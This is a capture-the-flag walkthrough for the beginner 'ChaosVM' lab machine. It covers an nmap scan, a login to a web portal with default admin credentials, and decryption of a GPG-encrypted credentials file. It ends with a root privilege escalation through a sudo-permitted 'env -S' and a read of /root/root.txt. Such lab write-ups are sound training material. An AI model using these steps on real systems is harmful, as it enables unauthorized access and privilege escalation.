#  Welcome to my ChaosVM Walkthrough
This is the first and easiest of the EvilPWN CTF VMs. If you want to tackle this challenge you can download the VM from here:
`https://evilpwnctf.github.io/vms/`
## 1. Initial scan
Once we have our lab set up, we go ahead as usual and perform a regular, noisy nmap scan to all ports 
```nmap
nmap -A -p- 192.168.1.229
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-02 22:44 BST
Nmap scan report for 192.168.1.229
Host is up (0.0016s latency).
Not shown: 65533 closed ports
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
| 2048 88:0b:3f:3e:2f:57:57:7b:ad:0c:c9:6e:f1:81:04:cc (RSA)
| 256 73:0d:46:00:0e:43:78:97:94:37:fa:ac:1e:9c:a9:69 (ECDSA)
|_ 256 84:f3:72:01:cb:29:7a:ac:ad:1d:e9:5f:e0:50:3d:db (ED25519)
1337/tcp open http Apache httpd 2.4.38
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_ Basic realm=Atom's TOP SECRET PROTECTED FOLDER!
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: 401 Unauthorized
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.02 seconds
```
## 2. Enumerating website at Port 1337
##### :1337/index
Firstly we find ourselves with a login portal. The first thing coming right off the bat is trying the typical default creds, as nothing has been leaked from the initial scan `admin:admin`
Once we are in we are led towards the folder `/data`. We are also provided with a suspicious string, `#chaoseverywhere`. We take a note of it and save it for later.
##### :1337/data
We see a file named `creds.txt.gpg`. It's time for us to grab the file. We can either use wget or curl, I prefer wget myself: `wget http://admin:admin@192.168.1.229:1337/data/creds.txt.gpg`
## 3. Decrypting the file
Given a txt.gpg file, we assume it's a plain text file encrypted with gpg. After a quick `man gpg` research, we learn we can decrypt it easily using -d: `gpg -d creds.txt.gpg`
This is the time to try the suspicious string we found earlier, the password to decrypt the file is `chaoseverywhere`
Now we have the creds for Port 22: `bob:pwn4abl3p4ssw0rd7331`
## 4. Privileges Escalation:
We connect to port 22 using ssh and the creds we found in the earlier step.
After some minutes enumerating and finding nothing, it's time we tried to escalate privileges. If we do `sudo -l` we see we can run `/usr/bin/env` as root.
If we check the manpage of `env`, we see we can parse commands using -S, so we go ahead and try 
```bash
env -S whoami
root
```
We finish the machine reading the root.txt file in the root folder:

```bash
env -S cat /root/root.txt
```

## Conclusion
This has been a nice and short VM for beginners that covers some web enumerating, cryptography and linux privesc. Submit your flag in EvilPWN CTF discord channel.
Brought to us by the autor âtøm, thank you very much. You can follow him on his github page https://github.com/0xatom and in EvilPWN CTF Discord server.

